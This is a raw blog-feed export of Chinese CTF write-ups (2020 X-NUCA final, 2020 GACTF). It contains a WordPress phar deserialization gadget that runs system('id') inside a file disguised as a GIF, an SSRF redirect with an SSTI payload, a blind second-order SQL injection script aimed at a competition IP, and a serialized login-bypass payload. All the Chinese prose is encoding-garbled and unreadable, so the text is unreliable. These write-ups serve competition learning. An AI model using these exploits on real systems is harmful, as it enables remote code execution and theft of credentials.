class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// replace globals from our internal store</span></span><br><span class="line">    $restore = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_preserve <span class="keyword">as</span> $name =&gt; $class) &#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            !<span class="keyword">isset</span>($GLOBALS[$name]) ||</span><br><span class="line">            !($GLOBALS[$name] <span class="keyword">instanceof</span> $class)</span><br><span class="line">        ) &#123;</span><br><span class="line">            $restore[$name] = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[$name])) &#123;</span><br><span class="line">                $restore[$name] = $GLOBALS[$name];</span><br><span class="line">            &#125;</span><br><span class="line">            $GLOBALS[$name] = <span class="keyword">$this</span>-&gt;_restorables[$name];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requests_Utility_FilteredIterator</span> <span class="keyword">extends</span> <span class="title">ArrayIterator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $callback;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data, $callback</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ai1ec_Shutdown_Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $_callbacks;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_callbacks = <span class="keyword">new</span> Requests_Utility_FilteredIterator(<span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>), <span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?xxx __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub, å¢åŠ gifæ–‡ä»¶å¤´ï¼Œä¼ªé€ æ–‡ä»¶ç±»å‹</span></span><br><span class="line"><span class="comment">//$o = new WC_Log_Handler_File();</span></span><br><span class="line">$o = <span class="keyword">new</span> Ai1ec_Shutdown_Controller();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨éœ€è¦æ‰¾åˆ°è§¦å‘ç‚¹ï¼Œæ–‡ç« ä¸­çš„ rpc æ²¡æœ‰äº†ï¼Œéœ€è¦å†æ‰¾ã€‚</p><p>ç»§ç»­æ²¿ç€<code>wp_get_attachment_thumb_file</code>å‘å‰å¯»æ‰¾è°ƒç”¨ï¼Œå‘ç°<code>wp-includes/media.php</code> çš„<code>image_downsize</code>æ–¹æ³•ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209085624477.png" alt="image-20201209085624477"></p><p>å¯»æ‰¾è°ƒç”¨ï¼Œ<code>wp-include/media.php</code>ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209085643919.png" alt="image-20201209085643919"></p><p>è¿™é‡Œé˜Ÿå‹ç›´æ¥åœ¨å‡ ä¸ªè°ƒç”¨å¤„éƒ½ä¸‹æ–­ç‚¹ï¼Œç„¶ååœ¨ media å¤„éšä¾¿ç‚¹å‡»ï¼Œçœ‹å“ªé‡Œå¯ä»¥æ–­ã€‚æœ€åå‘ç°æ–°å»ºä¸€ç¯‡æ–‡ç« ï¼Œå¹¶æ·»åŠ  mediaï¼Œå¯ä»¥è§¦å‘åˆ° image_downsize å‡½æ•°ã€‚è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209085849053.png" alt="image-20201209085849053"></p><p>åé¢<code>$file</code>ä¸ <code>$imagedata[&#39;thumb&#39;]</code>å‚è€ƒåŸæ¥é‚£ç¯‡æ–‡ç« ï¼Œå®é™…åˆ©ç”¨èµ·æ¥å…¶å®æŒºéº»çƒ¦çš„ã€‚</p><p>é¦–å…ˆæ³¨å†Œä¸ªè´¦æˆ·ï¼Œåœ¨ /wp-admin ä¸‹ï¼Œä¼ ä¸€ä¸ª mediaï¼ˆ phar æ„é€ å‡ºçš„ï¼‰ã€‚</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090350107.png" alt="image-20201209090350107"></p><p>ä¿å­˜åœ¨äº† <code>wp-content/uploads/2020/12/phar.gif</code>ã€‚</p><p>ç„¶åæˆ‘ä»¬éœ€è¦æ§åˆ¶è¿™ä¸ª media çš„<code>$file</code>ä¸ <code>$imagedata[&#39;thumb&#39;]</code>ï¼Œå‚è€ƒæ–‡ç« çš„æ‰“æ³•ã€‚æ‰“å¼€ç¼–è¾‘è¿™ä¸ª media çš„é¡µé¢ï¼Œæˆ‘çš„ç½‘å€æ˜¯ <code>http://192.168.43.44/wp-admin/post.php?post=68&amp;action=edit</code>ã€‚å¯ä»¥çœ‹åˆ° post_id æ˜¯ 68 ã€‚ç„¶åè·å– wp_nonceï¼Œå‘åŒ…ã€‚</p><p>æ§åˆ¶<code>$file</code>ï¼šï¼ˆéœ€è¦ä¿®æ”¹_wpnonceä¸post_IDï¼‰</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090459620.png" alt="image-20201209090459620"></p><p>æ§åˆ¶ <code>$imagedata[&#39;thumb&#39;]</code>ï¼šï¼ˆéœ€è¦ä¿®æ”¹ _wpnonceï¼Œpost_ID ä¸ thumbï¼‰</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090542718.png" alt="image-20201209090542718"></p><p>ç„¶åè§¦å‘ååºåˆ—åŒ–ï¼Œæ–°å»ºä¸€ç¯‡æ–‡ç« ï¼Œæ·»åŠ  mediaï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090549933.png" alt="image-20201209090549933"></p><p>ç‚¹å‡»insertï¼ŒæŠ“åŒ…ã€‚ä¿®æ”¹ <code>attachment[image-size]=thumbnail</code>ï¼Œè¿™æ ·æ‰èƒ½è¿›åˆ°<code>wp_get_attachment_thumb_file</code>ä¸­ã€‚</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090559959.png" alt="image-20201209090559959"></p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090603399.png" alt="image-20201209090603399"></p><p>å¦ä¸€æ¡è§¦å‘é“¾ï¼Œå½“æ—¶åšé¢˜æ—¶ä¹Ÿçœ‹åˆ°äº†ï¼Œåé¢æ²¡å»è°ƒé‚£ä¸ªï¼Œåº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><p>ä¹Ÿæ˜¯å¯»æ‰¾è°ƒç”¨ image_downsizeï¼Œåœ¨ <code>wp-admin/includes/media.php</code>çš„<code>image_size_input_fields</code>å‡½æ•°ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209091547264.png" alt="image-20201209091547264"></p><p>ç»§ç»­å‘å‰æ‰¾è°ƒç”¨ï¼Œä¾æ¬¡æ˜¯<code>wp-admin/includes/media.php</code>ä¸­çš„ <code>get_attachment_fields_to_edit</code>å‡½æ•°ã€<code>get_media_item</code>å‡½æ•°ï¼Œæœ€å<code>wp-admin/async-upload.php</code>ä¸­è°ƒç”¨äº† <code>get_media_item</code>å‡½æ•°ã€‚</p><p>æ‰€ä»¥è§¦å‘é“¾æ˜¯ <code>get_media_item</code>  -&gt; <code>get_attachment_fields_to_edit</code> -&gt; <code>image_size_input_fields</code> -&gt; <code>image_downsize</code> -&gt;  <code>wp_get_attachment_thumb_file</code>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 GACTF writeup</title>
      <link href="/2020/08/31/2020-GACTF/"/>
      <url>/2020/08/31/2020-GACTF/</url>
      
        <content type="html"><![CDATA[<p>Web ä¸ Crypto å¤§éƒ¨åˆ†é¢˜ç›®éš¾åº¦ä¸å¤§ï¼Œæ•´ç†ä¸‹é¢˜è§£ã€‚</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="XWiki"><a href="#XWiki" class="headerlink" title="XWiki"></a>XWiki</h3><p>CVE 2020-11057ï¼Œå‚è€ƒ<a href="https://jira.xwiki.org/browse/XWIKI-16960">https://jira.xwiki.org/browse/XWIKI-16960</a>ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡ŒPythonä»£ç ã€‚å‘ç°æ ¹ç›®å½•ä¸‹ /readflagï¼Œè¦å›ç­”ä¸¤ä¸ªæ•°å“ªä¸ªå¤§ï¼Œè¾“å…¥0æˆ–è€…1ã€‚æ‹–ä¸‹æ¥é€†å‘ï¼Œå†™ä¸ªè„šæœ¬è‡ªåŠ¨äº¤äº’ï¼ˆé¢˜ç›®ç¯å¢ƒé‡Œæ‹‰çš„233ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line">p = Popen(<span class="string">&#x27;./readflag&#x27;</span>, stdin=PIPE, stdout=PIPE)</span><br><span class="line">t = p.stdout.readline().strip()</span><br><span class="line">t = p.stdout.readline().strip()</span><br><span class="line">t = p.stdout.readline().strip().decode()</span><br><span class="line">f = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">464</span>):</span><br><span class="line">data = t.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">int</span>(data[<span class="number">5</span>]) &gt; <span class="built_in">int</span>(data[<span class="number">7</span>])):</span><br><span class="line">p.stdin.write(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">flag+=<span class="string">&quot;0&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.stdin.write(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">flag+=<span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">t = p.stdout.readline().decode()</span><br><span class="line">print(t)</span><br><span class="line">f += t</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŠŠ 01 æµè½¬æˆflagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&quot;01100111011000010110001101110100011001100111101101011000010101110110100101101011011010010101111101000011010101100100010101011111011101110110100101110100011010000110111101110101011101000101111101110000011001010111001001101101011010010111001101110011011010010110111101101110010111110111001101100011011100100110100101110000011101000110100101101110011001110101111101100101011110000110010101100011011101010111010001101001011011110110111000100001001000010010000101111101&quot;</span></span><br><span class="line"><span class="built_in">print</span> long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h3><p><img src="/2020/08/31/2020-GACTF/image-20200831143516520.png" alt="image-20200831143516520"></p><h3 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h3><p><code>ctf.__globals__</code>ï¼Œå¯ä»¥å‘ç°adminçš„è·¯ç”±ï¼Œçœ‹èµ·æ¥æ˜¯ä¸ªssrfï¼Œä½†æ˜¯banæ‰äº† 127.0.0.1ã€‚</p><p><img src="/2020/08/31/2020-GACTF/image-20200831143707256.png" alt="image-20200831143707256"></p><p>5000ç«¯å£ï¼Œåº”è¯¥æ˜¯è¦ssrfæœ¬åœ°çš„5000ç«¯å£æœåŠ¡ã€‚</p><p>å‰é¢å¯ä»¥å‘ç°æ˜¯ requestsï¼Œå°è¯• 302 è·³è½¬ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Location: http://127.0.0.1:5000/&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰sstiï¼Œç›´æ¥æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Location: http://127.0.0.1:5000/&#123;&#123;config&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2020/08/31/2020-GACTF/image-20200831143901156.png" alt="image-20200831143901156"></p><h3 id="carefuleyes"><a href="#carefuleyes" class="headerlink" title="carefuleyes"></a>carefuleyes</h3><p><a href="http://www.zip">www.zip</a> æºç å®¡è®¡ã€‚</p><p>æˆ‘ä»¬ç›®æ ‡æ˜¯è°ƒç”¨XCTFGGçš„loginæ–¹æ³•ï¼ŒæˆåŠŸç™»é™†adminï¼š</p><p><img src="/2020/08/31/2020-GACTF/image-20200831144039840.png" alt="image-20200831144039840"></p><p>æœ‰ä¸ªååºåˆ—åŒ–å¯ä»¥å®Œæˆloginæ–¹æ³•è°ƒç”¨ï¼Œç°åœ¨é—®é¢˜æ˜¯å¦‚ä½•è·å–æƒé™æ˜¯adminçš„ç”¨æˆ·åå’Œå¯†ç ã€‚</p><p>å¯ä»¥çœ‹åˆ° sql æ–‡ä»¶ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`un`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> un;</span><br><span class="line"><span class="keyword">USE</span> un;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`file`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`file`</span> (</span><br><span class="line">  <span class="string">`fid`</span> <span class="built_in">int</span>(<span class="number">10</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`filename`</span> <span class="built_in">varchar</span>(<span class="number">256</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`oldname`</span> <span class="built_in">varchar</span>(<span class="number">256</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`view`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`extension`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`fid`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">11</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`user`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`user`</span> (</span><br><span class="line">  <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">12</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`privilege`</span> <span class="built_in">varchar</span>(<span class="number">8</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`username`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">11</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment"># INSERT INTO user VALUES (&#x27;XM&#x27;, $db_pass, &#x27;admin&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">1</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ’å…¥äº†ä¸€ä¸ªusernameä¸ºXMçš„ç”¨æˆ·ï¼Œå¯†ç æœªçŸ¥ï¼Œæˆ‘ä»¬éœ€è¦æ³¨å…¥å‡ºå¯†ç ã€‚</p><p>å®¡è®¡ä¸€ä¸‹å‘ç°å‡ ä¹æ‰€æœ‰ç›´æ¥å…¥åº“çš„æ“ä½œå‰éƒ½æœ‰è½¬ä¹‰æ“ä½œï¼Œå°è¯•å¯»æ‰¾äºŒæ¬¡æ³¨å…¥ï¼Œåœ¨rename.phpä¸­ï¼š</p><p><img src="/2020/08/31/2020-GACTF/image-20200831144324731.png" alt="image-20200831144324731"></p><p>æŸ¥è¯¢å‡ºæ¥çš„ç»“æœç›´æ¥æ‹¼æ¥åˆ°äº†æŸ¥è¯¢è¯­å¥ä¸­ï¼Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><p>å†™ä¸ªç›²æ³¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">map</span>(<span class="built_in">ord</span>,string.printable)</span><br><span class="line">    payload = <span class="string">&#x27;(select ascii(substr(password,&#123;mid&#125;,1)) from user)=&#123;value&#125;&#x27;</span></span><br><span class="line">    filename = <span class="string">&quot;gml&#x27;and &#123;sql&#125;#&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">            sql = payload.<span class="built_in">format</span>(mid=i,value=j)</span><br><span class="line">            name = filename.<span class="built_in">format</span>(sql=sql)</span><br><span class="line">            <span class="comment"># print name</span></span><br><span class="line">            paramsMultipart = [(<span class="string">&#x27;upfile&#x27;</span>, (<span class="string">&quot;%s.txt&quot;</span>%name, <span class="string">&quot;gml\n&quot;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>))]</span><br><span class="line">            headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://124.71.191.175&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://124.71.191.175/&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>&#125;</span><br><span class="line">            session.post(<span class="string">&quot;http://124.71.191.175/upload.php&quot;</span>, files=paramsMultipart, headers=headers)</span><br><span class="line"></span><br><span class="line">            paramsPost = &#123;<span class="string">&quot;newname&quot;</span>: <span class="string">&quot;111&quot;</span>, <span class="string">&quot;oldname&quot;</span>: <span class="string">&quot;%s&quot;</span>%name&#125;</span><br><span class="line">            headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://124.71.191.175&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://124.71.191.175/rename.php&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">            response = requests.post(<span class="string">&quot;http://124.71.191.175/rename.php&quot;</span>, data=paramsPost, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;gml&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                data += <span class="built_in">chr</span>(j)</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span> data</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            exit(<span class="string">&quot;No!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line">    <span class="comment"># password:qweqweqwe</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨å‡ºå¯†ç æ˜¯ qweqweqweã€‚ç›´æ¥æ„é€ åºåˆ—åŒ–æ•°æ®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> XCTFGG(<span class="string">&#x27;login&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;XM&#x27;</span>,<span class="string">&#x27;qweqweqwe&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/08/31/2020-GACTF/image-20200830195855714.png" alt="image-20200830195855714"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="square"><a href="#square" class="headerlink" title="square"></a>square</h3><p>å‚è€ƒï¼š<a href="https://math.stackexchange.com/questions/528669/what-is-the-smallest-integer-n-greater-than-1-such-that-the-root-mean-square">https://math.stackexchange.com/questions/528669/what-is-the-smallest-integer-n-greater-than-1-such-that-the-root-mean-square</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 